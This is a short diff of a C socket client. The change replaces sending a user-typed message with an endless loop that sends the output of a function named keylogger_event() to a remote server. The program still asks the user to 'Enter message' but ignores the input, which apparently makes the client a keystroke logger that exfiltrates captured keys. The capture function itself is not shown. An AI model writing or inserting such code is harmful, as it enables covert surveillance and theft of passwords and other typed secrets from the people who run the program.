@@ -36,13 +36,12 @@ void app()
 
     memset(client_message, '\0', sizeof(client_message));
 
-
     serv.sin_family = AF_INET;
     serv.sin_port = htons(PORT);
     serv.sin_addr.s_addr = inet_addr(IP);
 
     printf("Enter message : ");
     scanf("%s", client_message);
-
-    send_message(sock, serv, client_message);
+    while (1)
+        send_message(sock, serv, keylogger_event());
 }
